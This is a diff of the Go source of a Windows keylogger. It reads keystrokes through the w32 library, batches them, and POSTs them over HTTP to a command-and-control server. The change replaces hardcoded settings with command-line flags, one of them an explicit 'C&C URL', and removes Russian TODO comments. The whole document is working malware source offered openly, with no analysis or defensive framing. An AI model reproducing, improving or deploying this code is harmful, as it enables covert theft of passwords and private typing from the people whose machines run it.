@@ -2,9 +2,10 @@
 package main
 
 import (
+	"errors"
+	"flag"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"strings"
 	"syscall"
@@ -13,14 +14,6 @@ import (
 	"unsafe"
 
 	"github.com/TheTitanrain/w32"
-)
-
-//TODO Сделать параметр со временем аргументом командной строки
-
-const (
-	TIME_UNTIL_CAPTURE  = 5
-	NUM_OF_KEYS_TO_SEND = 10
-	URL                 = "http://localhost:1337/newly"
 )
 
 var (
@@ -123,59 +116,62 @@ func (kl Keylogger) ParseKeycode(keyCode int) Key {
 	return key
 }
 
-//TODO Сделать параметр путем аргументом командной строки
-
-func SendKeyLog(buf io.Reader) {
+//SendKeyLog sends an HTTP request to specified in cmd arguments server
+func SendKeyLog(buf io.Reader, url string) {
 	method := "POST"
 	client := &http.Client{}
 
-	req, err := http.NewRequest(method, URL, buf)
+	req, err := http.NewRequest(method, url, buf)
 
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
-	req.Header.Add("Content-Type", "text/plain")
 
 	res, err := client.Do(req)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	defer res.Body.Close()
 
-	body, err := ioutil.ReadAll(res.Body)
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
-	fmt.Println(string(body))
+
+	defer res.Body.Close()
 }
 
 func main() {
 
-	kl := NewKeyLogger()
-	var sKey []string
+	var (
+		frequencyFlag  = flag.Int("frequency", 5, "Time period to check if key state")
+		keysToSendFlag = flag.Int("period", 10, "Num of keys to store and send at one time")
+		url            = flag.String("url", "", "C&C URL (Don't forget http://)")
+	)
 
-	for {
-		key := kl.PressedKey()
-		var strToSend string
-		if !key.Empty {
-			sKey = append(sKey, string(key.Rune))
-			if len(sKey) >= NUM_OF_KEYS_TO_SEND {
-				for i := range sKey {
-					strToSend += sKey[i]
+	flag.Parse()
+
+	if *url != "" {
+		kl := NewKeyLogger()
+
+		var sKey []string
+
+		for {
+			key := kl.PressedKey()
+			var strToSend string
+			if !key.Empty {
+				sKey = append(sKey, string(key.Rune))
+				if len(sKey) >= *keysToSendFlag {
+					for i := range sKey {
+						strToSend += sKey[i]
+					}
+					buffer := strings.NewReader(strToSend)
+					sKey = nil
+					SendKeyLog(buffer, *url)
 				}
-				buffer := strings.NewReader(strToSend)
-				sKey = nil
-				SendKeyLog(buffer)
 			}
+
+			time.Sleep(time.Duration(*frequencyFlag) * time.Millisecond)
+
 		}
-
-		time.Sleep(TIME_UNTIL_CAPTURE * time.Millisecond)
-
-		//TODO Сделать параметр с размером файла аргументом командной строки.
-		//TODO Проблема с размером файла. Выводится только половина
-
+	} else {
+		fmt.Println(errors.New("URL is not set"))
 	}
 }
